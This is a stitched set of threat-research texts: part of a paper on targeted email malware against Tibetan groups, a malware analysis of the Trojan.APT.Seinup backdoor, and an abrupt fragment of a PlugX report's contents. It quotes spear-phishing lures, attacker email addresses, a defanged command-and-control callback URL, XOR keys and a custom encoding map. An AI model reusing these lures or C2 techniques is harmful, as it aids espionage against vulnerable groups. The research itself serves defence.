Gh0st RAT was discovered by the Citizen Lab in their                                                                                                  
analysis of GhostNet <fn>[25]</fn> and IEXPL0RE RAT was dis-                                                                                                   
covered and named for the ﬁrst time in our work.In this case, the FinFisher at-
                                                                                       
tack scores 4.0 on the TTI (base targeting score of 2 with
                                                                                       
a technical multiplier of 2).Although the email used
                                                                                       
in the attack references the name and organization of a
                                                                                       
real journalist, the content is poorly customized, and has
                                                                                       
attributes that look questionable.The sample
                                                                                       
also uses multiple minor forms of protection, including
                                                                                       
at least half a dozen anti-debugging tricks.Even though
                                                                                       
the technical multiplier is the maximum value, the over-
                                                                                       
all TTI score is only 4.0 due to the low targeting base
                                                                                       
value.FinFisher is only effective if it is surreptitiously
                                                                                       
installed on a users’ computer.If the malware is deliv-
                                                                                       
ered through an email attachment, infection is only suc-
                                                                                       
cessful if the user opens the malicious ﬁle.Similar ﬁndings can also be observed in attacks using
                                                                                       
DaVinci RCS developed by Italy-based company Hack-
                                                                                       
   ing Team against activists and independent media groups
                                                                                       
from the United Arab Emirates and Morocco <fn>[36]</fn>.These results support the idea that different threat ac-           
tors have varying focuses and levels of resources, and                
as a result, different methodologies for attacks.For ex-             
ample, the majority of malware submitted by our study                 
groups appear to be from adversaries that have in-house               
malware development capabilities and the capacity to                  
organize and implement targeted malware campaigns.These adversaries are spending signiﬁcant effort on so-               
cial engineering, but generally do not use technically                
advanced malware.Conversely, the adversaries using                   
FinFisher and DaVinci RCS have bought these products                  
rather than develop malware themselves.However, while                
the FinFisher and RCS samples are technically sophisti-               
cated pieces of malware, the attacks we analyzed are not              
sophisticated in terms of social engineering tactics.Average TTI scores in our dataset may               
be skewed due to the self-reporting method we use in the              
study.Very good threats are less likely to be noticed and            
reported while being sent to far fewer people, and low-               
quality emails are much more likely to be sent in bulk                
and stand out.It is also possible that individuals in differ-        
ent groups may be more diligent in submitting samples,                
which could affect between group comparisons.We are                  
more interested, however, in worst-case (highest) scores              
and not in comparing the average threat severity between              
organizations.Finally, this metric is calculated based on the technical          
sophistication of the payload, not on the speciﬁc exploit.There is currently no method to modify the TTI score in               
a way similar to the temporal metrics used by the CVSS                
metric.A temporal metric could be added to increase                  
the ﬁnal TTI value for 0-day vulnerabilities, or possibly             
to reduce the score for exploits that are easily detectable           
due to a public and well-known generation script, e.g.Metasploit <fn>[2]</fn>           

</section>
<section>
<heading>                                                                    
5     Implications                                                    
</heading>                                                                      
Our study primarily focuses on threats that groups work-              
ing on human rights issues related to Tibet or China are              
currently facing.While our dataset is concentrated on                
these types of groups, our results have implications for              

   how CSOs can protect themselves against email-based
targeted malware.Speciﬁcally, we ﬁnd that moving towards cloud-based
platforms (e.g., Google Docs) instead of relying on e-
mail attachments would prevent more than 95% of the
e-mail malware seen by 2 out of 3 Tibetan groups that
had more than 50 e-mail submissions.Further, our results highlight the potential for lower-
cost user education initiatives to guard against sophis-
ticated social engineering attacks, rather than high cost
technical solutions.This observation stems from the fact
that much of the malware we observe is not technically
sophisticated, but rather relies on social engineering to
deliver its payload by convincing users to open malicious
attachments or links.Other studies <fn>[35, 36, 38]</fn> that have
revealed the use of commercial malware products against
CSOs and journalists have shown that many of these
cases also rely on duping users into opening malicious
e-mail attachments or social engineered instant messag-
ing conversations.These incidents show that even ad-
vanced targeted malware requires successful exploitation
of users through social engineering tactics.User education can be a powerful tool against the
kinds of targeted attacks we observed in this study.In-
deed, the Tibetan community has taken an active ap-
proach with campaigns that urge Tibetan users to not
send or open attachments and suggests alternative cloud
based options such as Google Docs and Dropbox for
sharing documents <fn>[53]</fn>.We have also engaged the Ti-
betan groups in a series of workshops to introduce train-
ing curriculum which draws on examples submitted by
organizations participating in our study.We have also
provided them with technical background to identify sus-
picious e-mail headers and how to use free services to
check the validity of suspicious links in e-mail messages.The mitigation strategies presented here are focused
on email vectors and do not consider all of the possible
attacks these groups may face.We highlight these strate-
gies in particular because the majority of groups in our
study identiﬁed document-based targeted malware as a
high priority information security concern.The adver-
saries behind these attacks are highly motivated and will
likely adapt their tactics as users change their behaviors.For example, it is plausible that if every user in a partic-
ular community began to avoid opening attachments and
document-based malware infected fewer targets, attack-
ers may move on to vectors such as waterhole attacks or
attacks on cloud document platforms to ﬁll the gap.User
education and awareness raising activities need to be on-
going efforts that are informed by current research on the
state of threats particular communities are experiencing.Evaluation of the effectiveness of user education efforts
in at risk communities and corresponding reactions from
attackers is required to understand the dynamics between
                                                                 11
<footer>USENIX Association 	                                                                     23rd USENIX Security Symposium  537</footer>
these processes.</section>
<section>
<heading>                                                                   
6   Related Work
</heading>                                                                   
There is a wide body of literature on ﬁltering and detec-
tion methods for spam <fn>[27,42,45,52,70,71]</fn> and phishing             
emails and websites <fn>[12, 34, 39, 69]</fn>.Attention has also
been given to evaluating user behavior around phishing             
attacks and techniques for evading them <fn>[6, 30, 33]</fn>.By            
comparison research on detecting email vectors used for            
targeted malware attacks is limited.A notable excep-              
tion is <fn>[4, 5]</fn>, which uses threat and recipient features           
with a random forest classiﬁer to detect targeted mali-            
cious emails in a dataset from a large Fortune 500 com-            
pany.Other work has focused on imporoving detection               
of documents (e.g.PDF, Microsoft Ofﬁce) with embed-               
ded malicious code <fn>[13, 51, 57]</fn>                                    
   Another area of research explores methods for model-            
ing the stages of targeted attacks and using these mod-            
els to develop defenses.Guira and Wang <fn>[19]</fn> propose               
a conceptual attack model called the attack pyramid to             
model targeted attacks and identify features that can be           
detected at the various stages.Hutchins, Cloppert and             
Amin, <fn>[24]</fn> use a kill chain model to track targeted at-            
tack campaigns and inform defensive strategies.Metrics have been developed to characterize security            
vulnerabilities and their severity <fn>[7, 41, 50]</fn>.The indus-         
try standard is the Common Vulnerability Scoring Sys-              
tem (CVSS) <fn>[17]</fn>, which uses three metric groups for                
characterizing vulnerabilities and their impacts.These            
groups are: base metric group (the intrinsic and fun-              
damental characteristics of a vulnerability that are con-          
stant over time and user environments), temporal metric
group (characteristics of a vulnerability that change over         
time but not among user environments) and environmen-
tal metric group (characteristics of a vulnerability that          
are relevant and unique to a particular user’s environ-            
ment).The CVSS is a widely adopted metric, but only               
rates technical vulnerabilities.Targeted attacks rely on a        
user action of opening a malicious attachment or visiting          
a malicious link to successfully compromise a system.Therefore, the sophistication of message lures and other           
social engineering tactics are an important part of deter-
mining the severity of a targeted attack.Systems like the
                                                                   
CVSS cannot address this contextual component.Our study makes the following contributions to the              
literature.Previous studies of targeted attacks against           
CSOs usually focus on particular incidents or campaigns            
and do not include longitudinal observations of attacks            
against a range of CSO targets.We address this gap through development
of the TTI and validate the metric against four years of
data collected from 10 CSOs.</section>
<section>
<heading>
7    Conclusions
</heading>
Our study provides an in-depth look at targeted malware
threats faced by CSOs.We ﬁnd that considering the
technical sophistication of these threats alone is insuf-
ﬁcient and that educating users about social engineer-
ing tactics used by adversaries can be a powerful tool
for improving the security of these organizations.Our
results point to simple steps groups can take to protect
themselves from document-based targeted malware such
as shifting to cloud-based document platforms instead
of relying on attachments which can contain exploits.Further research is needed to measure the effectiveness
of education strategies for changing user behaviour and
how effective these efforts are in mitigation of document-
based malware for CSOs.Further work is also required
in monitoring how attackers adapt tactics in response to
observed behavioural changes in targeted communities.In ongoing work we are continuing our collection of e-
mails and NIDS alerts as well as monitoring other attacks
against these groups (e.g., waterhole attacks and DoS at-
tacks) to understand how threats vary based on their de-
livery mechanism.We are also working to extend our
methodology to more diverse CSO communities such as
those in Latin America, Africa, and other underreported
regions to better document the politically motivated dig-
ital threats they may be experiencing.</section>
<section>
<heading>
Acknowlegements</heading>
This work was supported by the John D. and Catherine T.
MacArthur Foundation.We are grateful to Jakub Dalek,
Sarah McKune, and Justin Wong for research assistance.We thank the USENIX Security reviewers and our shep-
herd Prof. J. Alex Halderman for helpful comments and
guidance.We are especially grateful to the groups who
participated in our study.</section>
<section>
References
<footnote>
 [1] https://www.hex-rays.com/products/ida/.[2] http://www.metasploit.com/.[3] http://www.ollydbg.de/.[4] A MIN , R. M. Detecting Targeted Malicious Emails Through Su-
     pervised Classiﬁcation of Persistent Threat and Recipient Ori-
     ented Features.Doctor of philisophy, George Washington Uni-
     versity, 2011.[5] A MIN , R. M., RYAN , J., H, J. C., AND VAN D ORP, J. R. De-
     tecting Targeted Malicious Email.IEEE Security & Privacy 10,
     3 (2012), 64–71.12
<footer>538  23rd USENIX Security Symposium	                                                                              USENIX Association</footer>
 [6] B LYTHE , M., P ETRIE , H., AND C LARK , J.A. F for Fake: Four        
     Studies on How We Fall for Phish.In Proceedings of the SIGCHI           
     Conference on Human Factors in Computing Systems (New York,              
     NY, USA, 2011), CHI ’11, ACM, pp.3469–3478.[7] CERT.Vulnerability Notes Database Field Descriptions, 2014.[8] C HIEN , E., AND O’G ORMAN , G. The Nitro Attack: Stealing               
     Secrets from the Chemical Industry.Tech.rep., Symantec, 2011.[9] C ITIZEN L AB.Information Operations and Tibetan Rights in              
     the Wake of Self-Immolations: Part I.Tech.rep., University of
     Toronto, 2012.[10] C ITIZEN L AB.Recent Observations in Tibet-Related Information          
     Operations: Advanced social engineering for the distribution of          
     LURK malware.Tech.rep., University of Toronto, 2012.[11] C ITIZEN L AB.Permission to Spy: An Analysis of Android Mal-            
     ware Targeting Tibetans.Tech.rep., University of Toronto, 2013.[12] C OVA , M., K RUEGEL , C., AND V IGNA , G. There is no free              
     phish: an analysis of free and live phishing kits.In Proceedings        
     of the 2nd Conference on USENIX Workshop on Offensive Tech-              
     nologies (July 2008), USENIX Association, p. 4.[13] C ROSS , J. S., AND M UNSON , M. A.Deep pdf parsing to extract          
     features for detecting embedded malware.Tech.rep., Sandia Na-          
     tional Laboratories, 2011.[14] D EEP E ND R ESEARCH.Library of Malware Trafﬁc Patterns,                
     2013.[15] FAGERLAND , S. The Many Faces of Gh0st Rat.Tech.rep.,                  
     Norman, 2012.[16] FAGERLAND , S. PlugX used against Mongolian targets.Tech.rep., 2013.[17] FIRST.Common Vulnerability Scoring System (CVSS-SIG),
                                                                              
     2007.[18] G ALPERIN , E VA , M ARQUIS -B OIRE , M ORGAN , S COTT-
                                                                              
     R AILTON , J. Quantum of Surveillance: Familiar Actors and
                                                                              
     Possible False Flags in Syrian Malware Campaigns — Electronic
     Frontier Foundation.Tech.rep., Electronic Frontier Foundation          
     and The Citizen Lab, University of Toronto.[19] G IURA , P., AND WANG , W. A Context-Based Detection Frame-              
     work for Advanced Persistent Threats.International Conference           
     on Cyber Security (CyberSecurity) 0 (2012), 69–74.[20] G OOGLE.A new approach to China, 2012.[21] G RAGIDO , W. Lions at the Watering Hole: The VOHO Affair.Tech.rep., RSA, 2012.[22] H ARDY, S. IEXPL0RE RAT.Tech.rep., Citizen Lab, University             
     of Toronto, 2012.[23] H ARDY, S ETH K LEEMOLA , K. Surtr: Malware Family Targeting             
     the Tibetan Community.Tech.rep., Citizen Lab, University of            
     Toronto, 2013.[24] H UTCHINS , E. M., C LOPPERT, M. J., AND A MIN , R. M.                   
     Intelligence-driven computer network defense informed by anal-           
     ysis of adversary campaigns and intrusion kill chains.In 6th            
     International Conference on Information Warfare and Security             
     (2011).[25] I NFORMATION WARFARE M ONITOR.Tracking GhostNet: In-
                                                                              
     vestigating a Cyber Espionage Network.Tech.rep., University
                                                                              
     of Toronto, 2009.[26] I NFORMATION WARFARE M ONITOR.Shadows in the Cloud:                     
     Investigating Cyber Espionage 2.0.Tech.rep., University of
                                                                              
     Toronto, 2010.[27] J UNG , J., AND S IT, E. An Empirical Study of Spam Trafﬁc and
                                                                              
     the Use of DNS Black Lists.In Proceedings of the 4th ACM SIG-
     COMM Conference on Internet Measurement (New York, NY,                   
     USA, 2004), IMC ’04, ACM, pp.370–375.[28] K ASPERSKY L AB.The NetTraveler Attacks.Tech.rep., Trend
     Micro, 2013.[29] K ASPERSKY L AB.Unveiling ”Careto” - The Masked APT.Tech.rep., 2014.[30] K IRLAPPOS , I., AND S ASSE , M.-A.Security Education against
     Phishing: A Modest Proposal for a Major Rethink.Security Pri-
     vacy, IEEE 10, 2 (Mar.2012), 24–32.[31] K REBS , B.Espionage Hackers Target Watering Hole Sites, 2012.[32] L I , F., L AI , A., AND D DL , D. Evidence of Advanced Persis-
     tent Threat: A case study of malware for political espionage.In
     2011 6th International Conference on Malicious and Unwanted
     Software (Oct. 2011), IEEE, pp.102–109.[33] L IN , E., G REENBERG , S., T ROTTER , E., M A , D., AND AY-
     COCK , J.Does Domain Highlighting Help People Identify Phish-
     ing Sites?In Proceedings of the SIGCHI Conference on Human
     Factors in Computing Systems (New York, NY, USA, 2011), CHI
     ’11, ACM, pp.2075–2084.[34] M AIORCA , D., C ORONA , I., AND G IACINTO , G. Looking at the
     Bag is Not Enough to Find the Bomb: An Evasion of Structural
     Methods for Malicious PDF Files Detection.In Proceedings of
     the 8th ACM SIGSAC Symposium on Information, Computer and
     Communications Security (New York, NY, USA, 2013), ASIA
     CCS ’13, ACM, pp.119–130.[35] M ARCZAK , B., G UARNIERI , C., M ARQUIS -B OIRE , M., AND
     S COTT-R AILTON , J. Hacking Team and the Targeting of
     Ethiopian Journalists.Tech.rep., Citizen Lab, University of
     Toronto, 2014.[36] M ARQUIS -B OIRE , M. Backdoors are Forever: Hacking Team
     and the Targeting of Dissent.Tech.rep., Citizen Lab, University
     of Toronto, 2013.[37] M ARQUIS -B OIRE , M.        Iranian anti-censorship software
     ’Simurgh’ circulated with malicious backdoor.Tech.rep., Cit-
     izen Lab, University of Toronto, 2013.[38] M ARQUIS -B OIRE , M., M ARCZAK , B., G UARNIERI , C., AND
     S COTT-R AILTON , J.For Their Eyes Only: The Commercial-
     ization of Digital Spying.Tech.rep., Citizen Lab, University of
     Toronto, 2013.¨
[39] M AURER , M.-E., AND H OFER   , L. Sophisticated Phishers Make
     More Spelling Mistakes: Using URL Similarity against Phishing.In CSS (2012), pp.414–426.[40] M C A FEE.Enfal, 2008.[41] M ICROSOFT C ORPORATION.Security Bulletin Severity Rating
     System, 2012.[42] PANTEL , P., AND L IN , D. SpamCop: A Spam Classiﬁcation
     & Organization Program.In Learning for Text Categorization:
     Papers from the 1998 Workshop (1998), pp.95–98.[43] PAZ , R. D. PlugX: New Tool For a Not So New Campaign.Tech.rep., Trend Micro, 2012.[44] P ERLROTH , N. Chinese Hackers Inﬁltrate New York Times
     Computers, Jan. 2013.[45] R AMACHANDRAN , A., F EAMSTER , N., AND V EMPALA , S. Fil-
     tering spam with behavioral blacklisting.In Proceedings of the
     14th ACM conference on Computer and communications security
     - CCS ’07 (New York, New York, USA, Oct. 2007), ACM Press,
     p. 342.[46] R ILEY, M., AND L AWRENCE , D. Hackers Linked to Chinas
     Army Seen From EU to D.C., 2012.[47] ROGIN , J. NSA Chief: Cybercrime constitutes the greatest trans-
     fer of wealth in history.Foreign Policy (2012).[48] RSA.Anatomy of an Attack.13
<footer>USENIX Association 	                                                                                 23rd USENIX Security Symposium  539</footer>
[49] S ANCHO , DAVID , V ILLENEUVE , N. LURID: Attribution Isn’t
                                                                            
     Easy.Tech.rep., Trend Micro.[50] SANS.@Risk: The Consensus Security Alert, 2014.[51] S MUTZ , C., AND S TAVROU , A. Malicious PDF Detection Using
     Metadata and Structural Features.In Proceedings of the 28th           
     Annual Computer Security Applications Conference (New York,
     NY, USA, 2012), ACSAC ’12, ACM, pp.239–248.[52] TAYLOR , B. Sender Reputation in a Large Webmail Service.In
     Third Conference on Email and Anti-Spam (CEAS 2006) (2006).[53] T IBET ACTION I NSTITUTE.https://tibetaction.net/detach-from-
     attachments/.[54] T REND M ICRO.IXESHE: An APT campaign.Tech.rep., 2012.[55] T REND M ICRO.Luckycat Redux: Inside an APT campaign with             
     multiple targets in India and Japan.Tech.rep., 2012.[56] T REND M ICRO.2Q Report on Targeted Attack Campaigns.Tech.rep., 2013.[57] T ZERMIAS , Z., S YKIOTAKIS , G., P OLYCHRONAKIS , M., AND
     M ARKATOS , E. P. Combining Static and Dynamic Analysis for
                                                                            
     the Detection of Malicious Documents.In Proceedings of the
     Fourth European Workshop on System Security (New York, NY,             
     USA, 2011), EUROSEC ’11, ACM, pp.4:1—-4:6.[58] U NITED NATIONS.International Covenant on Civil and Political
     Rights.[59] U NITED NATIONS.International Covenant on Economic, Social
     and Cultural Rights.[60] U NITED NATIONS.The Universal Declaration of Human Rights.[61] VAN H ORENBEECK , M. Crouching PowerPoint, Hidden Trojan.In 24th Chaos Communications Congress (2007).[62] VAN H ORENBEECK , M. Cyber attacks against Tibetan commu-              
     nities.Tech.rep., Sans Institute, 2008.[63] VAN H ORENBEECK , M. Is Troy Burning?An overview of tar-
     geted trojan attacks.In SANSFire 2008 (2008).[64] V ILLENEUVE , N. Human Rights and Malware Attacks.Tech.rep., Citizen Lab, University of Toronto, 2010.[65] V ILLENEUVE , N. Nobel Peace Prize, Amnesty HK and Mal-
                                                                            
     ware.Tech.rep., Citizen Lab, University of Toronto, 2010.[66] V ILLENEUVE , N. Trends in targeted attacks.Tech.rep., Trend
     Micro, 2011.[67] V ILLENEUVE , N., AND WALTON , G. Targeted Malware Attack
     on Foreign Correspondents based in China.Tech.rep., Informa-         
     tion Warfare Monitor, University of Toronto, 2009.[68] V ILLENEUVE , N., AND WALTON , G. 0day: Civil Society and              
     Cyber Security.Tech.rep., Information Warfare Monitor, Uni-
                                                                            
     versity of Toronto, 2009.[69] X IANG , G., H ONG , J., ROSE , C. P., AND C RANOR , L.                
     CANTINA+: A Feature-Rich Machine Learning Framework for
     Detecting Phishing Web Sites.ACM Trans.Inf.Syst.Secur.14, 2       
     (Sept. 2011), 21:1—-21:28.[70] Z HANG , L., Z HU , J., AND YAO , T. An Evaluation of Statisti-        
     cal Spam Filtering Techniques.Transactions on Asian Language
                                                                            
     Information Processing 3, 4 (Dec. 2004), 243–269.[71] Z HOU , Y., M ULEKAR , M. S., AND N ERELLAPALLI , P. Adap-             
     tive Spam Filtering Using Dynamic Feature Space.In Pro-
     ceedings of the 17th IEEE International Conference on Tools            
     with Artiﬁcial Intelligence (Nov. 2005), IEEE Computer Society,        
     pp.302–309.NIDS alerts, website monitoring, and interviews), and cluster anal-
 ysis of campaigns in a forthcoming technical report available at
 https://citizenlab/targeted-threats
 </footnote>
 <section>
 <heading>
 Appendix</heading>
 A     Examples of targeted e-mails
 In this section, we provide speciﬁc examples of e-mails
 that would be assigned targeting scores described in Sec-
 tion 4.2.2.Targeting Score 1 (Targeted Not customized).The e-
 mail in Figure 6 was sent to Tibet group 1.The message
 content and sender are vague and do not relate to the in-
 terest of the group.The attachment is a word document
 implanted with malware.The lack of relevant informa-
 tion in this message gives it a score of 1 (targeted, not
 customized).Targeting Score 2 (Targeted, Poorly Customized).The e-mail in Figure 7 was sent to Tibet group 1.It refer-
 ences Tibetan self-immolations which is an issue of inter-
 est to the group.However, the sender does not appear to
 be from a real person or organization.The message con-
 tent is terse and does not referenced information that can
 be externally validated.Therefore this message scores a
 2 (targeted, poorly customized).Please find the attachment of the activity                      
  report of Tibetan Career Centre, Bylakuppe                      
  with this mail.As I was asked to send                          
  this activity report to your office.Thank you.Regards,                                                        
  Palden Sangpo, Consultant.The e-
                                                                  
mail in Figure 8 was sent to Tibet group 2.On the sur-
face it appears to be a professional e-mail from “Palden          
Sangpo” a consultant at the Tibet Career Centre.The              
e-mail sender address and signature reference accurate            
contact details that can be easily veriﬁed through an In-         
ternet search.However, the e-mail headers reveal the             
purported e-mail sender address is fraudulent and the             
actual sender was albano_kuqo@gmx.com.The e-mail                 
generally addresses the organization rather than the indi-        
vidual recipient.Therefore this message scores a 3 (tar-         
geted, customized).Targeting Score 4 (Targeted Personalized).The e-                 
mail in Figure 9 was sent to Tibet group 1.It is directly        
addressed to the director of the group and appears to             
come from Mr. Cheng Li, a prominent China scholar                 
based at the Brookings Institute.The e-mail address              
is made to appear to be from Mr. Cheng Li, but from               
an AOL account (chengli.brookings@aol.com) that was               
registered by the attackers.The message asks the recip-          
ient for information on recent Tibetan self-immolations.The level of customization and personalization used in
<figure>
     From: Cheng Li <chengli.brookings@aol.com>
  Subject:Happy Tib Losar and Ask You a
  Favour
  23 Feb 2012
  To: [Tibet Group 1]
  Dear [Redacted]
  I am Cheng Li from John L. Thornton China
  Center of Brookings.I will attend an
  annual meeting on Religious Research
  with CIIS in Shanghai next week, and
  plan to take the chance to visit Tibet.Attached is a list of tibetans who have
  self-immolated from 2009 which my assistant
  prepared for me, but i am not sure of its
  accuracy.Would you please have a look
  and make necessary corrections.I will be
  really much appreciated if you could do me
  the favor and offer some more information
  about the latest happenings inside tibet.Thank you again and happy Tib losar!Cheng Li
  Director of Research, John L. Thornton
  China Center
  Brookings Institution
  1 Attachment:      list_of_self_immolations.xls
  </figure>
  Figure 9: Example of e-mail with Targeting Score 4
this message gives it a score of 4 (targeted, personalized).Targeting Score 5 (Targeted Highly Personalized).Targeting scores of 5 (targeted, highly personalized) re-
quire reference to internal information to the target orga-
nization that could not be obtained through open sources.Examples of messages scoring at this level include an
e-mail that purported to come from a funder of China
Group 3 that provided details of an upcoming meeting
the group actually had scheduled with the funder.In
another example, Tibet Group 2 and Tibet Group 3 re-
ceived separate e-mails that contained speciﬁc personal
details about a South African group’s visit to Dharam-
sala, India that appear to have been repurposed from a
real private communication.The malicious attachment
contained an authentic travel itinerary, which would be
displayed after the user opened the document.The pri-
vate information used in these messages suggest that the
attackers performed signiﬁcant reconnaissance of these
groups and likely obtained the information through prior
compromise.15
<footer>USENIX Association 	                                                                  23rd USENIX Security Symposium  541</footer>

</section></doc><doc>
<header>Trojan.APT.Seinup Hitting ASEAN</header>
<section>
<heading>1.Executive Summary</heading>

The FireEye research team has recently identified a number of spear phishing activities targeting Asia and ASEAN.Of these, one of the spear phishing documents was
suspected to have used a potentially stolen document as a decoy.The rich and contextual details (body and metadata) which are not available online lead us to believe this
was stolen.This decoy document mentioned countries such as Brunei, Cambodia, Indonesia, Laos, Malaysia, Myanmar, Philippines, Singapore, Thailand, and Vietnam,
which leads us to suspect that these countries are targeted.As the content of this decoy document is suspected to be a stolen sensitive document, the details will not be
published.This malware was found to have used a number of advance techniques which makes it interesting:

   1.The malware leverages Google Docs to perform redirection to evade callback detection.This technique was also found in the malware dubbed “Backdoor.Makadocs”
      reported by Takashi Katsuki (Katsuki, 2012).2.It is heavily equipped with a variety of cryptographic functions to perform some of its functions securely.3.The malicious DLL is manually loaded into memory which hides from DLL listing.As depicted in the diagram below, the spear phishing document (which exploits CVE-2012-0158) creates a decoy document and a malware dropper named exp1ore.exe.This dropper will then drop wab.exe (Address Book Application) and wab32res.dll (malicious DLL) inside the temp folder.By running wab.exe, the malicious DLL named
wab32res.dll (located within the same folder) will be loaded using DLL side-loading technique.This will in turn install a copy of wab32res.dll as msnetrsvw.exe inside the
windows directory to be registered as Windows service.By registering as a Windows service, it allows the malware to survive every reboot and persist on the network.<figure></figure>

<caption>Figure 1 Infection Flow</caption>

This malware is named “Trojan.APT.Seinup” because one of its export functions is named “seinup”.This malware was analysed to be a backdoor that allows the attacker to
remote control the infected system.<figure></figure>
<caption>Figure 2 Exported Functions</caption>
</section>
<section>
<heading>2.Related APT Domain and MD5</heading>

Based on our threat intelligence and reverse-engineering effort, below are some related domain and MD5 sums.Please note that some of the domain/IP association may
change.</section>
<section>
<heading>2.1.Malware to be installed as a service.msnetrsvw.exe                         FB2FA42F052D0A86CBDCE03F5C46DD4D
                                                                       Note: This is the same as wab32res.dll.Interesting Technical Observations</heading>

<heading>3.1.Redirection Using Google Docs</heading>

By connecting the malicious server via Google Docs, the malicious communication is protected by the legitimate SSL provided by Google Docs (see Figure below).One
possible way to examine the SSL traffic is to make use of a hardware SSL decrypter within an organisation.Alternatively, you may want to examine the usage pattern of the
users.Suppose a particular user accesses Google Docs multiple times a day, the organization’s Incident Response team may want to dig deeper to find out if the traffic is
triggered by a human or by malware.<figure></figure>
<caption>Figure 3 Retrieve Command via Google Docs</caption>

Below is the code that is used to construct a URL that retrieves command via Google Docs.First, the malicious URL is constructed and then encoded.Next, the malware
simply leverages the Google Docs viewer to retrieve the command from the malicious server (see Figure below).<figure></figure>

<caption>Figure 4 View Command via GoogleDocs</caption>
</section>
<section>
<heading>3.2.Zero-Skipping XOR Encryption</heading>

The shellcode encryption technique is fairly standard.The shellcode has a decryption stub which decrypts its body using the XOR key 0x9E, and this shellcode is used to
extract exp1ore.exe(malware) and Wor.doc (benign document).The exp1ore.exe and Wor.doc were found within the spear phishing document encrypted using the same key (0xFC) and technique.The XOR key decrypts only a non-zero
byte (see Figure 5).This prevents statistical methods of recovering the XOR key.The encrypted executable file and benign document were identified to be located inside the
spear phishing document at offsets 0×2509 and 0×43509 respectively.<figure></figure>

<caption>Figure 5 Zero Skipping XOR Encryption</caption>

Even though statistical methods may not be useful in identifying the XOR key as the zero bytes are not encrypted, we could use some of the “known” strings below to hunt
for the XOR key in this situation.By sliding the known string across the array of bytes to perform a windowed XOR, the key would be revealed when the encoded data is
XORed with the known string.“This program cannot be run in DOS mode”
      “KERNEL32.dll”
      “LoadLibraryA”
</section>
<section>
<heading>3.3.Deployment of Various Cryptographic Functions</heading>
<heading>3.3.1.Secure Callback</heading>

The malware performs the callback in a secure manner.It uses a custom Base64 map to encode its data, and creates a salted digital thumbprint to allow validation of data.Below describes the steps to validate a callback using an example of the following URL:

hxxp://www.elizabearden.com/waterphp/BYyH.php?dEIXozUlFzx=5P&wDq=6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk==&k4fJdSp7=cc3237bc79192a096440faca0fdae10&GvQF2lotIr5bT2=

The URL could be generalised as follows:

Domain/<PHP>?<rand 11-13 char>=<A’>&<rand 3-5 char>=<B’>&<rand 7-9 char>=<C’>&<rand 14-16 chars>=<D’>

The definition of A’, B’, C’ and D’ are as follows:

Let H be the function which encodes binary into hexadecimal characters prepend with “%”, if it is not alphanumeric, dash, underscore or dot.Let B64 be the base 64 encoder using the following custom map, “URPBnCF1GuJwH2vbkLN6OQ/5S9TVxXKZaMc8defgiWjmo7pqrAstyz0D+El3I4hY”.Let PT be the plain text which is in the form of “<HostName>[<RunType>]:<IPAddress>{1}”, where HostName and IPAddress are string, and RunType is a character.Note: This example is mocked up using a dummy computer name and IP address.The python code below could be used to decode the custom encoded string (see Figure below).<figure></figure>
<caption>Figure 6 Python to Decode a Custom Base 64</caption>
</section>
<section>
<heading>3.3.2.Random Generator Using Mersenne Twister Algorithm</heading>

The malware was found to perform a callback at random intervals so as to evade network investigation when looking for network connections that are performed in a
regular interval.Additionally, even the name of the parameters in the get string have a random length and name, which makes it hard to create a fix signature to detect such
callbacks (see 3.3.1 to understand how a callback is created).<figure></figure>

<caption>Figure 7 Mersenne Twister Algorithm Seeding function</caption>
</section>
<section>
<heading>3.4.In-Memory Only Malicious Code</heading>

On the disk, the malicious code is either encrypted or compressed to evade scanning using signature rules.Only upon being loaded into memory, does the malicious code
(that appears to be in the form of a DLL) get manually loaded without the use of Windows 32 API.In this way, when an investigation is performed, the malicious DLL is not
revealed.Additionally, it makes it much harder for analysis to be performed.<figure></figure>
<caption>Figure 8 Segments in the memory which contains the malicious code</caption>

Taking a deeper look at the decrypted malicious code, this malware was found to contain at least the following functions:

      Download file
      Download and execute or load library
      Change sleep duration
      Open and close interactive sessions
</section>
<section>
<heading>4.Conclusion</heading>

Malware is increasingly becoming more contextually advanced.It attempts to appear as much as possible like legitimate software or documents.In this example, we would
conclude the following.1.A potentially stolen document was used as a decoy document to increase its credibility.It is also a sign that the compromised organisations could be used as a soft
      target to compromise their business partners and allies.2.It is important to put a stop to the malware infection at the very beginning, which is the exploitation phase.Once a network is compromised, it is increasingly harder
      to detect such threats.3.Anti-incident response/forensic techniques are increasingly used to evade detection.It would require a keen eye on details and a wealth of experience to identify all
      these advance techniques.</section>
<section>
<heading>5.Works Cited</heading>

Carnegie Mellon University.(n.d.).Retrieved from http://www.cs.cmu.edu/~fp/courses/15122-f10/misc/rand/mersenne.c0

Katsuki, T. (19 Nov, 2012).Malware Targeting Windows 8 Uses Google Docs.Retrieved from http://www.symantec.com/connect/blogs/malware-targeting-windows-8-
uses-google-docs-0

I would like to thank several colleagues for their significant contributions on this post: Darien Kindlund, Ned Moran, Nart Villeneuve, and Thoufique Haq.</section>
</doc>......................................6
  2.2 Sharing .........................................6

3 Executive summary                                                                                                                              6

4 Analysis                                                                                                                                        6
  4.1 Techniques used ....................................6
  4.2 Execution process ....................................7
      4.2.1 Diagram .....................................7
      4.2.2 Explanation ...................................7
  4.3 Implemented commands ................................10
  4.4 Command details ....................................12
      4.4.1 Option ......................................12
      4.4.2 Disk .......................................12
      4.4.3 Screen ......................................12
      4.4.4 Process .....................................12
      4.4.5 Service ......................................12
      4.4.6 Shell .......................................12
      4.4.7 Telnet ......................................13
      4.4.8 RegEdit .....................................13
      4.4.9 Nethood .....................................13
      4.4.10 Portmap .....................................13
      4.4.11 SQL .......................................13
      4.4.12 Netstat .....................................13
      4.4.13 Keylogger ....................................13
  4.5 Other notable commands and functions           .......................13
      4.5.1 log ........................................13
  4.6 Persistency .......................................15
  4.7 Control .........................................15
  4.8 Network and domain information ...........................16
      4.8.1 Network .....................................16
      4.8.2 Domain .....................................17
  4.9 Current version and history of PlugX .........................18

A Appendix                                                                                                                                       18
  A.1 Indicators of Compromise (IOC) ...........................18
      A.1.1 Pipes ......................................18
      A.1.2 Files and directories ..............................18
      A.1.3 Registry .....................................19
      A.1.4 Network (hostname and destination IP                 addresses)                  .............19
  A.2 References ........................................19
  A.3 VirusTotal results ....................................4          VeriSign Class 3 Code Signing 2004 CA
        5          Class 3 Public Primary C e r t i f i c a t i o n Authority
        6      Signing date : 5 : 2 4 PM 5/8/2009
        7      P u b l i s h e r : McAfee , Inc .8      D e s c r i p t i o n : McAfee VirusMap Reporting module
        9      Product : McAfee VirusScan API
